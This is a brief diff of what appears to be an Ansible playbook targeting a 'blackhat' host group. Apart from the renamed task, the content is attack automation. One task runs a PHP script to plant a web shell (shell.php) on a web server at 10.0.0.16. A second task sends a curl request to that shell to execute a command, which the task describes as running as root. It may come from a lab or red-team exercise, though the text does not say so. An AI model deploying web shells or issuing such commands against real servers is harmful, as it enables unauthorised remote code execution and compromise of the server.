@@ -35,7 +35,7 @@
 - name: implement shell injection to webserver
   hosts: blackhat
   tasks:
-    - name: log in web server and upload shell file
+    - name: log in web server and inject it with shell file
       raw: php shellinject.php logs.txt 10.0.0.16 shell.php
     - name: run shell command as root on web server
       raw: curl -X GET 10.0.0.16/images/shell.php\?cmd\=ls 
